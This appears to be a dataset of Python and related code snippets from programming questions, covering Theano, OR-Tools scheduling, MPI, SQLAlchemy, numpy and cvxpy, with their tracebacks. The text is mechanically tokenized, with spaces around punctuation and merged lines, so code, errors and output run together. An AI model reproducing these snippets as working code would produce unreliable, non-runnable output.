intOp ( x ) f = theano.function ( [ x ] , y ) inp = np.asarray ( [ [ 2 , 4 ] , [ 6 , 8 ] ] , dtype=theano.config.floatX ) out = f ( inp ) print inpprint out Traceback ( most recent call last ) : File `` stackoverflow.py '' , line 35 , in < module > out = f ( inp ) File `` /usr/local/lib/python2.7/dist-packages/theano/compile/function_module.py '' , line 871 , in __call__ storage_map=getattr ( self.fn , 'storage_map ' , None ) ) File `` /usr/local/lib/python2.7/dist-packages/theano/gof/link.py '' , line 314 , in raise_with_op reraise ( exc_type , exc_value , exc_trace ) File `` /usr/local/lib/python2.7/dist-packages/theano/compile/function_module.py '' , line 859 , in __call__ outputs = self.fn ( ) File `` /usr/local/lib/python2.7/dist-packages/theano/gof/op.py '' , line 912 , in rval r = p ( n , [ x [ 0 ] for x in i ] , o ) File `` stackoverflow.py '' , line 17 , in perform f_to_int = theano.function ( [ x ] , x ) File `` /usr/local/lib/python2.7/dist-packages/theano/compile/function.py '' , line 320 , in function output_keys=output_keys ) File `` /usr/local/lib/python2.7/dist-packages/theano/compile/pfunc.py '' , line 390 , in pfunc for p in params ] File `` /usr/local/lib/python2.7/dist-packages/theano/compile/pfunc.py '' , line 489 , in _pfunc_param_to_in raise TypeError ( 'Unknown parameter type : % s ' % type ( param ) ) TypeError : Unknown parameter type : < type 'numpy.ndarray ' > Apply node that caused the error : IntOp ( x ) Toposort index : 0Inputs types : [ TensorType ( float64 , matrix ) ] Inputs shapes : [ ( 2 , 2 ) ] Inputs strides : [ ( 16 , 8 ) ] Inputs values : [ array ( [ [ 2. , 4 . ] , [ 6. , 8 . ] ] ) ] Outputs clients : [ [ 'output ' ] ] Backtrace when the node is created ( use Theano flag traceback.limit=N to make it longer ) : File `` stackoverflow.py '' , line 30 , in < module > y = intOp ( x ) File `` /usr/local/lib/python2.7/dist-packages/theano/gof/op.py '' , line 611 , in __call__ node = self.make_node ( *inputs , **kwargs ) File `` stackoverflow.py '' , line 11 , in make_node return theano.Apply ( self , [ x ] , [ x.type ( ) ] ) HINT : Use the Theano flag 'exception_verbosity=high ' for a debugprint and storage map footprint of this apply node ."
C : \Python37\python.exe : No module named C : \Python37\Scripts\flask
a = 2b = a + 2a = 3
"Date | Day | Train | Cum_mileage_prev_day -- -- -- -- -- | -- -- -- -- - | -- -- -- -- - | -- -- -- -- -- -- -- -- -- -- -- 19/9/18 | WED | T32 | 24,300 19/9/18 | WED | T11 | 24,20019/9/18 | WED | T38 | 24,200 . . . . . . . . 19/9/18 | WED | T28 | 600 19/9/18 | WED | T15 | 200 19/9/18 | WED | T24 | 100 Route | Start | End | Total_km | route_type -- -- -- | -- -- -- -- - | -- -- -- -- -| -- -- -- -- -- -- -| -- -- -- -- -- -- - R11 | 5:00 | 00:00 | 700 | Long R32 | 6:00 | 00:50 | 600 | Long R16 | 5:20 | 23:40 | 600 | Long . . . . . . . . . .R41 | 11:15 | 12:30 | 10 | Short R42 | 11:45 | 13:00 | 10 | ShortR43 | 12:15 | 13:30 | 10 | Short R44 | 12:45 | 14:00 | 10 | ShortR45 | 13:20 | 14:35 | 10 | Short Date | Day | Train| Cum_mil_prev_day | first_assign | second_assign | total_km_day_end -- -- -- -| -- -- -- | -- -- -- -| -- -- -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- | -- -- -- -- -- -- -- -| -- -- -- -- -- -- -- -- 19/9/18| WED | T32 | 24,300 | R41 | R44 | 24,320 19/9/18| WED | T11 | 24,200 | R42 | R45 | 24,22019/9/18| WED | T38 | 24,200 | R43 | | 24,210 . . . . . . . . . . . .19/9/18| WED | T28 | 600 | R11 | | 130019/9/18| WED | T15 | 200 | R32 | | 80019/9/18| WED | T24 | 100 | R16 | | 700 from itertools import combinationsfrom ortools.sat.python import cp_modeldef test_overlap ( t1_st , t1_end , t2_st , t2_end ) : def convert_to_minutes ( t_str ) : hours , minutes = t_str.split ( ' : ' ) return 60*int ( hours ) +int ( minutes ) t1_st = convert_to_minutes ( t1_st ) t1_end = convert_to_minutes ( t1_end ) t2_st = convert_to_minutes ( t2_st ) t2_end = convert_to_minutes ( t2_end ) # Check for wrapping time differences if t1_end < t1_st : if t2_end < t2_st : # Both wrap , therefore they overlap at midnight return True # t2 does n't wrap . Therefore t1 has to start after t2 and end before return t1_st < t2_end or t2_st < t1_end if t2_end < t2_st : # only t2 wraps . Same as before , just reversed return t2_st < t1_end or t1_st < t2_end # They do n't wrap and the start of one comes after the end of the other , # therefore they do n't overlap if t1_st > = t2_end or t2_st > = t1_end : return False # In all other cases , they have to overlap return Truedef main ( ) : model = cp_model.CpModel ( ) solver = cp_model.CpSolver ( ) # data route_km = { 'R11 ' : 700 , 'R32 ' : 600 , 'R16 ' : 600 , 'R41 ' : 10 , 'R42 ' : 10 , 'R43 ' : 10 , 'R44 ' : 10 , 'R45 ' : 10 } train_cum_km = { 'T32 ' : 24_300 , 'T11 ' : 24_200 , 'T38 ' : 24_200 , 'T28 ' : 600 , 'T15 ' : 200 , 'T24 ' : 100 } route_times = { 'R11 ' : ( '05:00 ' , '00:00 ' ) , 'R32 ' : ( '06:00 ' , '00:50 ' ) , 'R16 ' : ( '05:20 ' , '23:40 ' ) , 'R41 ' : ( '11:15 ' , '12:30 ' ) , 'R42 ' : ( '11:45 ' , '13:00 ' ) , 'R43 ' : ( '12:15 ' , '13:30 ' ) , 'R44 ' : ( '12:45 ' , '14:00 ' ) , 'R45 ' : ( '13:20 ' , '14:35 ' ) } trains = list ( train_cum_km.keys ( ) ) routes = list ( route_km.keys ( ) ) num_trains = len ( trains ) num_routes = len ( routes ) assignments = { ( t , r ) : model.NewBoolVar ( 'assignment_ % s % s ' % ( t , r ) ) for t in trains for r in routes } # constraint 1 : each train must be used for r in routes : model.Add ( sum ( assignments [ ( t , r ) ] for t in trains ) == 1 ) # constraint 2 : each train must do at least one ( max two ) routes for t in trains : model.Add ( sum ( assignments [ ( t , r ) ] for r in routes ) > = 1 ) model.Add ( sum ( assignments [ ( t , r ) ] for r in routes ) < = 2 ) # constraint 3 : ensure the end of day cum km is less than 24_800 # create a new variable which must be in the range ( 0,24_800 ) day_end_km = { t : model.NewIntVar ( 0 , 24_800 , 'train_ % s_day_end_km ' % t ) for t in trains } for t in trains : # this will be constrained because day_end_km [ t ] is in domain [ 0 , 24_800 ] tmp = sum ( assignments [ t , r ] *route_km [ r ] for r in routes ) + train_cum_km [ t ] model.Add ( day_end_km [ t ] == tmp ) # constraint 4 : where 2 routes are assigned to a train , these must not overlap for ( r1 , r2 ) in combinations ( routes , 2 ) : if test_overlap ( route_times [ r1 ] [ 0 ] , route_times [ r1 ] [ 1 ] , route_times [ r2 ] [ 0 ] , route_times [ r2 ] [ 1 ] ) : for train in trains : model.AddBoolOr ( [ assignments [ train , r1 ] .Not ( ) , assignments [ train , r2 ] .Not ( ) ] ) # constraint 5 : trains with high cum km should be assigned short routes # and trains with low mileage to long routes score = { ( t , r ) : route_km [ r ] + train_cum_km [ t ] for t in trains for r in routes } for r in routes : model.Minimize ( sum ( assignments [ t , r ] *score [ t , r ] for t in trains ) ) status = solver.Solve ( model ) assert status in [ cp_model.FEASIBLE , cp_model.OPTIMAL ] for t in trains : t_routes = [ r for r in routes if solver.Value ( assignments [ t , r ] ) ] print ( f'Train { t } does route { t_routes } ' f'with end of day cumulative kilometreage of ' f ' { solver.Value ( day_end_km [ t ] ) } ' ) if __name__ == '__main__ ' : main ( ) Train T32 does route [ 'R42 ' , 'R45 ' ] with end of day cumulative kilometreage of 24320Train T11 does route [ 'R41 ' , 'R44 ' ] with end of day cumulative kilometreage of 24220Train T38 does route [ 'R43 ' ] with end of day cumulative kilometreage of 24210Train T28 does route [ 'R16 ' ] with end of day cumulative kilometreage of 1200Train T15 does route [ 'R32 ' ] with end of day cumulative kilometreage of 800Train T24 does route [ 'R11 ' ] with end of day cumulative kilometreage of 800"
"USE GlobalVariables USE MPI IMPLICIT NONE CHARACTER ( LEN=10 ) : : astring INTEGER : : comm , rank , size , mpierr ! Initialize MPI on first timestep IF ( tstep .LT . 2 ) THEN call MPI_INIT ( mpierr ) ENDIF ! make string to send to python astring = `` TEST '' ! MPI Test call MPI_Comm_size ( MPI_COMM_WORLD , size , mpierr ) call MPI_Comm_rank ( MPI_COMM_WORLD , rank , mpierr ) ! Send message to python CALL MPI_SEND ( astring , len ( astring ) , MPI_CHARACTER , 0 , 22 , MPI_COMM_WORLD , mpierr ) print * , 'MPI MESSAGE SENT ' , mpierr ! Initialize MPI on first timestep IF ( tstep .EQ . Nsteps-1 ) THEN call MPI_FINALIZE ( mpierr ) print * , 'MPI FINALIZED ! ' ENDIF from mpi4py import MPI import numpy as np import subprocess as sp import os # Start OW3D_SPH in the background and send MPI message os.chdir ( 'OW3D_run ' ) args = [ 'OceanWave3D_SPH ' , 'OW3D.inp ' ] pid = sp.Popen ( args , shell=False ) os.chdir ( '.. ' ) # Check if MPI is initialized comm = MPI.COMM_WORLD rank = comm.Get_rank ( ) # Receive message from fortran test = comm.recv ( source=0 , tag=22 ) # Let the program end output = pid.communicate ( ) with open ( 'test.txt ' , ' w ' ) as f : f.write ( test )"
"L = [ ' 1.1.1 . ' , ' 1.1.10 . ' , ' 1.1.11 . ' , ' 1.1.12 . ' , ' 1.1.13 . ' , ' 1.1.2 . ' , ' 1.1.3 . ' , ' 1.1.4 . ' ] 1.1.1.1.1.2.1.1.3.1.1.4.1.1.10.1.1.11.1.1.12.1.1.13 . L.sort ( key=lambda s : int ( re.search ( r ' . ( \d+ ) ' , s ) .group ( 1 ) ) )"
"> > > y = np.arange ( 10 ) > > > yarray ( [ 0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 ] ) > > > y [ 4 ] 4 > > > idx = [ 4 , 3 , 2 , 1 ] > > > y [ idx ] array ( [ 4 , 3 , 2 , 1 ] ) > > > idx = [ [ 4 , 3 ] , [ 2 , 1 ] ] > > > y [ idx ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > IndexError : too many indices for array > > > idx = [ [ [ 4 , 3 ] , [ 2 , 1 ] ] ] > > > y [ idx ] array ( [ [ 4 , 3 ] , [ 2 , 1 ] ] ) > > > idx = np.array ( [ [ 4 , 3 ] , [ 2 , 1 ] ] ) > > > y [ idx ] array ( [ [ 4 , 3 ] , [ 2 , 1 ] ] )"
"category1 = { 'type1 ' , 'type2 ' , 'type3 ' } category2 = { 'type4 ' , 'type5 ' } category3 = { 'type6 ' , 'type7 ' , 'type8 ' , 'type9 ' } category4 = { 'type10 ' , 'type11 ' } category5 = { 'type12 ' , 'type13 ' , 'type14 ' } if request_type in category1 : # process category1 request process_category1_request ( ... ) elif request_type in category2 : # process category2 request process_category2_request ( ... ) elif ..."
"import pygame.camerapygame.camera.init ( ) camera = pygame.camera.list_cameras ( ) [ 0 ] pyg = pygame.camera.Camera ( camera ( 640 , 480 ) , 'HSV ' ) -- snip -- if pyg.query_image ( ) : win.blit ( pyg.get_image ( surface=win ) , ( 0 , 0 ) ) pygame.quit ( ) Traceback ( most recent call last ) : File `` C : \Users\roche\AppData\Local\Programs\Python\Python37-32\lib\site-packages\pygame\_camera_vidcapture.py '' , line 31 , in init import vidcap as vcModuleNotFoundError : No module named 'vidcap'During handling of the above exception , another exception occurred : Traceback ( most recent call last ) : File `` C : \Users\roche\Documents\pygame_camera.py '' , line 5 , in < module > pygame.camera.init ( ) File `` C : \Users\roche\AppData\Local\Programs\Python\Python37-32\lib\site-packages\pygame\camera.py '' , line 68 , in init _camera_vidcapture.init ( ) File `` C : \Users\roche\AppData\Local\Programs\Python\Python37-32\lib\site-packages\pygame\_camera_vidcapture.py '' , line 33 , in init from VideoCapture import vidcap as vcModuleNotFoundError : No module named 'VideoCapture '"
"rd = rangedict ( ) rd [ ( 0 , 10 ) ] = 5print rd [ 4 ] # prints 5print rd [ 6 ] # prints 5rd [ ( 5 , 15 ) ] = 20print rd [ 4 ] # prints 5print rd [ 6 ] # prints 20"
"cdef class Rectangle : cdef int x0 , y0 cdef int x1 , y1 def __init__ ( self , int x0 , int y0 , int x1 , int y1 ) : self.x0 = x0 ; self.y0 = y0 ; self.x1 = x1 ; self.y1 = y1 cdef int _area ( self ) : cdef int area area = ( self.x1 - self.x0 ) * ( self.y1 - self.y0 ) if area < 0 : area = -area return area def area ( self ) : return self._area ( ) cdef class Rectangle : cdef int x0 , y0 cdef int x1 , y1 def __init__ ( self , int x0 , int y0 , int x1 , int y1 ) : self.x0 = x0 ; self.y0 = y0 ; self.x1 = x1 ; self.y1 = y1 cpdef int area ( self ) : cdef int area area = ( self.x1 - self.x0 ) * ( self.y1 - self.y0 ) if area < 0 : area = -area return area"
"from ctypes import ( windll , wintypes , c_char_p , c_void_p , byref ) from win32api import GetCurrentThreadfrom win32security import ( GetFileSecurity , DACL_SECURITY_INFORMATION , ImpersonateSelf , SecurityImpersonation , OpenThreadToken , TOKEN_ALL_ACCESS , MapGenericMask ) from ntsecuritycon import ( FILE_READ_DATA , FILE_WRITE_DATA , FILE_EXECUTE , FILE_ALL_ACCESS ) import pywintypesimport winntTRUE = 1def CheckAccess ( path , AccessDesired ) : result = wintypes.BOOL ( ) granted = wintypes.DWORD ( 0 ) privsetlength = wintypes.DWORD ( 0 ) fileSD = GetFileSecurity ( path , DACL_SECURITY_INFORMATION ) if not fileSD.IsValid ( ) : raise Exception ( `` Invalid security descriptor '' ) ImpersonateSelf ( SecurityImpersonation ) token = OpenThreadToken ( GetCurrentThread ( ) , TOKEN_ALL_ACCESS , TRUE ) mapping = wintypes.DWORD ( MapGenericMask ( AccessDesired , ( FILE_READ_DATA , FILE_WRITE_DATA , FILE_EXECUTE , FILE_ALL_ACCESS ) ) ) if not windll.advapi32.AccessCheck ( c_char_p ( str ( buffer ( fileSD ) ) ) , wintypes.HANDLE ( int ( token ) ) , AccessDesired , byref ( mapping ) , c_void_p ( 0 ) , # privilege set , optional byref ( privsetlength ) , # size of optional privilege set byref ( granted ) , byref ( result ) ) : code = GetLastError ( ) raise WindowsError ( GetLastError ( ) , FormatMessage ( code ) ) return bool ( result ) def HasReadAccess ( path ) : return CheckAccess ( path , FILE_READ_DATA ) def HasWriteAccess ( path ) : return CheckAccess ( path , FILE_WRITE_DATA ) if __name__ == `` __main__ '' : print ( HasReadAccess ( `` C : /Python26 '' ) ) WindowsError : [ Error 1338 ] The security descriptor structure is invalid . WindowsError : [ Error 122 ] The data area passed to a system call is too small ."
"import numpy as npimport pandas as pdimport matplotlib.pylab as pltimport datashader as dsimport datashader.transfer_functions as tffrom datashader.utils import export_imagefrom functools import partialbackground = `` white '' export = partial ( export_image , background = background , export_path= '' export '' ) N = 10000df = pd.DataFrame ( np.random.random ( ( N , 3 ) ) , columns = [ ' x ' , ' y ' , ' z ' ] ) f , ax = plt.subplots ( 2 , 2 ) ax_r = ax.ravel ( ) ax_r [ 0 ] .scatter ( df [ ' x ' ] , df [ ' y ' ] , df [ ' z ' ] .mean ( ) ) ax_r [ 1 ] .hist ( df [ ' x ' ] ) ax_r [ 2 ] .hist ( df [ ' y ' ] ) ax_r [ 3 ] .plot ( df [ ' z ' ] ) cvs = ds.Canvas ( plot_width=100 , plot_height=100 ) agg = cvs.points ( df , ' x ' , ' y ' , ds.mean ( ' z ' ) ) a = export ( tf.shade ( agg , cmap= [ 'lightblue ' , 'darkblue ' ] , how='eq_hist ' ) , 'test ' )"
cmake_minimum_required ( VERSION 3.1.0 )
"model = Sequential ( ) model.add ( Dense ( 1 , input_dim=1 , activation='softmax ' ) ) model.compile ( optimizer='rmsprop ' , loss='binary_crossentropy ' , metrics= [ 'accuracy ' ] ) X_train_shape = X_train.reshape ( len ( X_train ) , 1 ) Y_train_shape = Y_train.reshape ( len ( Y_train ) , 1 ) model.fit ( X_train , Y_train , nb_epoch=5 , batch_size=32 )"
"from django.db import modelsclass Addresses ( models.Model ) : name = models.CharField ( max_length=255 ) path = models.CharField ( max_length=255 ) id | name | path -- -- -- -- -- -- -- -- -- -- -- -- -- -- 1 | USA | 1 2 | California | 1.2 3 | Los Angeles | 1.2.3 id | full_name | path -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- - 1 | USA | 1 2 | California USA | 1.2 3 | Los Angeles California USA | 1.2.3 SELECT * , ts_rank_cd ( to_tsvector ( 'english ' , full_address ) , query ) AS rank FROM ( SELECT s.id , s.path , array_to_string ( array_agg ( a.name ORDER BY a.path DESC ) , ' ' ) AS full_address FROM `` Addresses '' AS s INNER JOIN `` Addresses '' AS a ON ( a.path @ > s.path ) GROUP BY s.id , s.path , s.name ) AS subquery , to_tsquery ( 'english ' , % s ) as query WHERE to_tsvector ( 'english ' , full_address ) @ @ queryORDER BY rank DESC ; JOIN `` Addresses '' AS a ON ( a.path @ > s.path )"
"saw see > > > print lmtzr.lemmatize ( 'saw ' , ' v ' ) saw"
"import pytestclass TEST : @ pytest.fixture ( scope= '' function '' , autouse=True ) def func_fixture ( self ) : return `` fail '' @ pytest.mark.skipif ( `` self.func_fixture=='fail ' '' ) def test_setting_value ( self ) : print ( `` Hello I am in testcase '' )"
"class A : aliases = None name = None def __init__ ( self , name ) : self.name = name self.aliases = set ( [ name ] ) def add_aliases ( self , a ) : self.aliases.add ( a ) def __repr__ ( self ) : return str ( self.name ) + str ( self.aliases ) arr = [ ] for i in range ( 3 ) : arr.append ( A ( i ) ) arr [ -1 ] .add_aliases ( i+1 ) for item in arr : print itemA.aliases = set ( [ ] ) # # Modify the static element of classfor item in arr : print item 0set ( [ 0 , 1 ] ) 1set ( [ 1 , 2 ] ) 2set ( [ 2 , 3 ] ) 0set ( [ 0 , 1 ] ) 1set ( [ 1 , 2 ] ) 2set ( [ 2 , 3 ] ) 0set ( [ 2 , 3 ] ) 1set ( [ 2 , 3 ] ) 2set ( [ 2 , 3 ] ) 0set ( [ ] ) 1set ( [ ] ) 2set ( [ ] )"
"class FixedSeed : def __init__ ( self , seed ) : self.seed = seed self.state = None def __enter__ ( self ) : self.state = rng.get_state ( ) np.random.seed ( self.seed ) def __exit__ ( self , exc_type , exc_value , traceback ) : np.random.set_state ( self.state )"
"import matplotlib.pyplot as pltimport numpy as nplinewidth = 2outward = 10ticklength = 4tickwidth = 1fig , ax = plt.subplots ( ) ax.plot ( np.arange ( 100 ) ) ax.tick_params ( right= '' off '' , top= '' off '' , length = ticklength , width = tickwidth , direction = `` out '' ) ax.spines [ `` top '' ] .set_visible ( False ) , ax.spines [ `` right '' ] .set_visible ( False ) for line in [ `` left '' , '' bottom '' ] : ax.spines [ line ] .set_linewidth ( linewidth ) ax.spines [ line ] .set_position ( ( `` outward '' , outward ) )"
"def searching_stuff_1 ( ) : # searching yield 1 # and searching yield 2 yield 3def searching_stuff_2 ( ) : yield 4 yield 5def gen ( ) : yield from searching_stuff_1 ( ) yield from searching_stuff_2 ( ) for result in gen ( ) : print ( result ) import asyncioasync def searching_stuff_1 ( ) : f = asyncio.Future ( ) result = [ ] await asyncio.sleep ( 1 ) # searching result.append ( 1 ) # searching result.append ( 2 ) result.append ( 3 ) f.set_result ( result ) return fasync def searching_stuff_2 ( ) : f = asyncio.Future ( ) result = [ ] await asyncio.sleep ( 1 ) result.append ( 4 ) result.append ( 5 ) f.set_result ( result ) return fasync def producer ( ) : coros = [ searching_stuff_1 ( ) , searching_stuff_2 ( ) ] for future in asyncio.as_completed ( coros ) : yield await futureasync def consumer ( xs ) : async for future in xs : for r in future.result ( ) : print ( r ) loop = asyncio.get_event_loop ( ) loop.run_until_complete ( consumer ( producer ( ) ) ) loop.close ( )"
"import pandas as pdimport datetimeimport numpy as npdf = pd.DataFrame ( { 'date ' : [ datetime.datetime ( 2010,1,1 ) +datetime.timedelta ( days=i*15 ) for i in range ( 0,100 ) ] } ) df [ 'year ' ] = [ d.year for d in df [ 'date ' ] ] df [ 'year ' ] = df [ 'date ' ] .apply ( lambda x : x.year ) df [ 'year ' ] = df [ 'date ' ] .apply ( year ) df [ 'year ' ] = df [ 'date ' ] .year"
"def format_currency ( amount ) : if amount is None : return `` '' else : result = `` $ % .2f '' % amount assert `` : '' not in result , ( `` That 's weird . The value % r of class % s is represented as % s '' % ( amount , amount.__class__ , result ) ) return result AssertionError : That 's weird . The value Decimal ( '54871.0000 ' ) of class < class'decimal.Decimal ' > is represented as $ 54870 . :0 from decimal import Decimalprint `` $ % .2f '' % Decimal ( '54871.0000 ' ) _exp : -4_int : 548710000_sign : 0_is_special : False def __float__ ( self ) : `` '' '' Float representation . '' '' '' return float ( str ( self ) ) print `` Str '' , str ( amount ) print `` Float '' , float ( amount )"
"from plotly.offline import download_plotlyjs , init_notebook_mode , plot , iplotimport plotly.graph_objs as goimport numpy as npN = 30random_x = np.random.randn ( N ) random_y = np.random.randn ( N ) # Create a tracetrace = go.Scatter ( x = random_x , y = random_y , mode = 'markers ' ) data = [ trace ] # Plot and embed in ipython notebook ! iplot ( data , filename='basic-scatter ' )"
@ numba.njit def foo ( x ) : return [ [ i for i in range ( 0 ) ] for _ in range ( x ) ] @ numba.njit def bar ( x ) : return [ [ ] for _ in range ( x ) ]
"# definitions.pyclass StatusCodes ( ParamEnum ) : Success = 1 Error = 2 UnexpectedAlpaca = 3class AlpacaType ( ParamEnum ) : Fuzzy = 0 ReallyMean = 1 # etc etc etc # param_enum.pyclass ParamEnum ( object ) : def __init__ ( self ) : self.__class__._metadata = get_class_metadata ( self.__class__ ) class StatusCodes ( ParamEnum ) : Success = 1 Error = 2 UnexpectedAlpaca = 3for var in locals ( ) : # or globals ? add_metadata ( var ) # does n't work because it is in the same file , modifying dict while iteratng class ParamEnum ( object ) : def __when_class_defined__ ( cls ) : add_metadata ( cls )"
"class WaifuPickBattle ( db.Model ) : `` '' '' Table which represents a where one girl is chosen as a waifu . '' '' '' __tablename__ = `` waifu_battles '' id = db.Column ( db.Integer , primary_key=True ) user_id = db.Column ( db.Integer , db.ForeignKey ( `` users.id '' ) , nullable=False ) date = db.Column ( db.DateTime , nullable=False ) winner_name = db.Column ( db.String , nullable=False ) loser_name = db.Column ( db.String , nullable=False ) def get_battle_appearences_cte ( ) : `` '' '' Create a sqlalchemy subquery of the battle appearences . '' '' '' wins = select ( [ WaifuPickBattle.date , WaifuPickBattle.winner_name.label ( `` name '' ) , expression.literal_column ( `` 1 '' ) .label ( `` was_winner '' ) , expression.literal_column ( `` 0 '' ) .label ( `` was_loser '' ) ] ) losses = select ( [ WaifuPickBattle.date , WaifuPickBattle.loser_name.label ( `` name '' ) , expression.literal_column ( `` 0 '' ) .label ( `` was_winner '' ) , expression.literal_column ( `` 1 '' ) .label ( `` was_loser '' ) ] ) return wins.union_all ( losses ) .cte ( `` battle_appearence '' ) def query_most_battled_waifus ( ) : `` '' '' Find the waifus with the most battles in a given date range . '' '' '' appearence_cte = get_battle_appearences_cte ( ) query = \ select ( [ appearence_cte.c.name , func.sum ( appearence_cte.c.was_winner ) .label ( `` wins '' ) , func.sum ( appearence_cte.c.was_loser ) .label ( `` losses '' ) , ] ) \ .group_by ( appearence_cte.c.name ) \ .order_by ( func.count ( ) .desc ( ) ) \ .limit ( limit ) return db.session.query ( query ) .all ( ) WITH battle_appearence AS ( SELECT waifu_battles.date AS date , waifu_battles.winner_name AS name , 1 AS was_winner , 0 AS was_loser FROM waifu_battles UNION ALL SELECT waifu_battles.date AS date , waifu_battles.loser_name AS name , 0 AS was_winner , 1 AS was_loser FROM waifu_battles ) SELECT name AS name , wins AS wins , losses AS lossesFROM ( SELECT battle_appearence.name AS name , sum ( battle_appearence.was_winner ) AS wins , sum ( battle_appearence.was_winner ) AS losses FROM battle_appearence GROUP BY battle_appearence.name ORDER BY count ( * ) DESC ) sqlalchemy.exc.ProgrammingError : ( psycopg2.errors.SyntaxError ) subquery in FROM must have an aliasLINE 6 : FROM ( SELECT battle_appearence.name AS name , count ( battle_ap ... ^ HINT : For example , FROM ( SELECT ... ) [ AS ] foo . [ SQL : WITH battle_appearence AS ( SELECT waifu_battles.date AS date , waifu_battles.winner_name AS name , 1 AS was_winner , 0 AS was_loser FROM waifu_battles UNION ALL SELECT waifu_battles.date AS date , waifu_battles.loser_name AS name , 0 AS was_winner , 1 AS was_loser FROM waifu_battles ) SELECT name AS name , wins AS wins , losses AS losses FROM ( SELECT battle_appearence.name AS name , count ( battle_appearence.was_winner ) AS wins , count ( battle_appearence.was_winner ) AS losses FROM battle_appearence GROUP BY battle_appearence.name ORDER BY count ( * ) DESC ) ] ( Background on this error at : http : //sqlalche.me/e/f405 ) query = query\ ... \ .alias ( `` foo '' ) WITH battle_appearence AS ( SELECT waifu_battles.date AS date , waifu_battles.winner_name AS name , 1 AS was_winner , 0 AS was_loser FROM waifu_battles UNION ALL SELECT waifu_battles.date AS date , waifu_battles.loser_name AS name , 0 AS was_winner , 1 AS was_loser FROM waifu_battles ) SELECT battle_appearence.name , sum ( battle_appearence.was_winner ) AS wins , sum ( battle_appearence.was_winner ) AS lossesFROM battle_appearenceGROUP BY battle_appearence.nameORDER BY count ( * ) DESC"
"booster [ 0 ] :0 : [ 101 < 0.142245024 ] yes=1 , no=2 , missing=1 1 : [ 107 < 0.102833837 ] yes=3 , no=4 , missing=3 3 : [ 101 < 0.039123565 ] yes=7 , no=8 , missing=7 7 : leaf=-0.0142603116 8 : leaf=0.023763923 4 : [ 101 < 0.0646461397 ] yes=9 , no=10 , missing=9 9 : leaf=-0.0345750563 10 : leaf=-0.0135767004 2 : [ 107 < 0.238691002 ] yes=5 , no=6 , missing=5 5 : [ 103 < 0.0775454491 ] yes=11 , no=12 , missing=11 11 : leaf=0.188941464 12 : leaf=0.0651629418 6 : [ 101 < 0.999929309 ] yes=13 , no=14 , missing=13 13 : leaf=0.00403384864 14 : leaf=0.236842111booster [ 1 ] :0 : [ 102 < 0.014829753 ] yes=1 , no=2 , missing=1 1 : [ 102 < 0.00999682024 ] yes=3 , no=4 , missing=3 3 : [ 107 < 0.0966737345 ] yes=7 , no=8 , missing=7 7 : leaf=-0.0387153365 8 : leaf=-0.0486520194 4 : [ 107 < 0.0922582299 ] yes=9 , no=10 , missing=9 9 : leaf=0.0301927216 10 : leaf=-0.0284226239 2 : [ 102 < 0.199759275 ] yes=5 , no=6 , missing=5 5 : [ 107 < 0.12201979 ] yes=11 , no=12 , missing=11 11 : leaf=0.093562685 12 : leaf=0.0127987256 6 : [ 107 < 0.298737913 ] yes=13 , no=14 , missing=13 13 : leaf=0.227570012 14 : leaf=0.113037519"
"if __check_freebsd__ ( ) : # run actions which would only work on FreeBSD ( e.g . create a jail ) elif __check_debian__ ( ) : # run an alternative that runs on Debian-based systemselse : raise Error ( `` unsupported OS '' ) try : lsb_release_id_short = sp.check_output ( [ lsb_release , `` -d '' , `` -s '' ] ) .strip ( ) .decode ( `` utf-8 '' ) ret_value = `` Debian '' in lsb_release_id_short return ret_valueexcept Exception : return False"
"bad_xml_chars = re.compile ( u ' [ ^\x09\x0A\x0D\u0020-\uD7FF\uE000-\uFFFD\U00010000-\U0010FFFF ] ' , re.U ) File `` C : \Python27\lib\re.py '' , line 190 , in compile return _compile ( pattern , flags ) File `` C : \Python27\lib\re.py '' , line 242 , in _compile raise error , v # invalid expression sre_constants.error : bad character range"
"# ! /usr/bin/env python # This is only needed for Python v2 but is harmless for Python v3.import sipsip.setapi ( 'QVariant ' , 2 ) from PyQt4 import QtGui # def main ( ) : if __name__ == '__main__ ' : import sys if len ( sys.argv ) > 1 : use_a = False print `` Do n't use a '' else : use_a = True print `` Use a '' if use_a : a = QtGui.QApplication ( sys.argv ) else : cpp = QtGui.QApplication ( sys.argv ) model = QtGui.QStandardItemModel ( 4,2 ) tableView = QtGui.QTableView ( ) tableView.setModel ( model ) tableView.show ( ) if use_a : sys.exit ( a.exec_ ( ) ) else : sys.exit ( cpp.exec_ ( ) ) # if __name__ == '__main__ ' : # main ( )"
def get_profile_info ( self ) : *fetch data from a couple of models* def profile ( request ) : profile_info = request.user.get_profile_info ( ) *rest of the view*
"from cvxpy import *import numpy as npx = Variable ( ( 9 , 9 ) , integer=True ) obj = Minimize ( sum ( x ) ) # whatever , if the constrains are fulfilled it will be fine const = [ x > = 1 , # all values should be > = 1 x < = 9 , # all values should be < = 9 sum ( x , axis=0 ) == 45 , # sum of all rows should be 45 sum ( x , axis=1 ) == 45 , # sum of all cols should be 45 sum ( x [ 0:3 , 0:3 ] ) == 45 , sum ( x [ 0:3 , 3:6 ] ) == 45 , # sum of all squares should be 45 sum ( x [ 0:3 , 6:9 ] ) == 45 , sum ( x [ 3:6 , 0:3 ] ) == 45 , sum ( x [ 3:6 , 3:6 ] ) == 45 , sum ( x [ 3:6 , 6:9 ] ) == 45 , sum ( x [ 6:9 , 0:3 ] ) == 45 , sum ( x [ 6:9 , 3:6 ] ) == 45 , sum ( x [ 6:9 , 6:9 ] ) == 45 , x [ 0 , 7 ] == 7 , # the values themselves x [ 0 , 8 ] == 1 , x [ 1 , 1 ] == 6 , x [ 1 , 4 ] == 3 , x [ 2 , 4 ] == 2 , x [ 3 , 0 ] == 7 , x [ 3 , 4 ] == 6 , x [ 3 , 6 ] == 3 , x [ 4 , 0 ] == 4 , x [ 4 , 6 ] == 2 , x [ 5 , 0 ] == 1 , x [ 5 , 3 ] == 4 , x [ 6 , 3 ] == 7 , x [ 6 , 5 ] == 5 , x [ 6 , 7 ] == 8 , x [ 7 , 1 ] == 2 , x [ 8 , 3 ] == 1 ] prob = Problem ( objective=obj , constraints=const ) prob.solve ( ) prob.statusOut [ 2 ] : 'infeasible_inaccurate '"
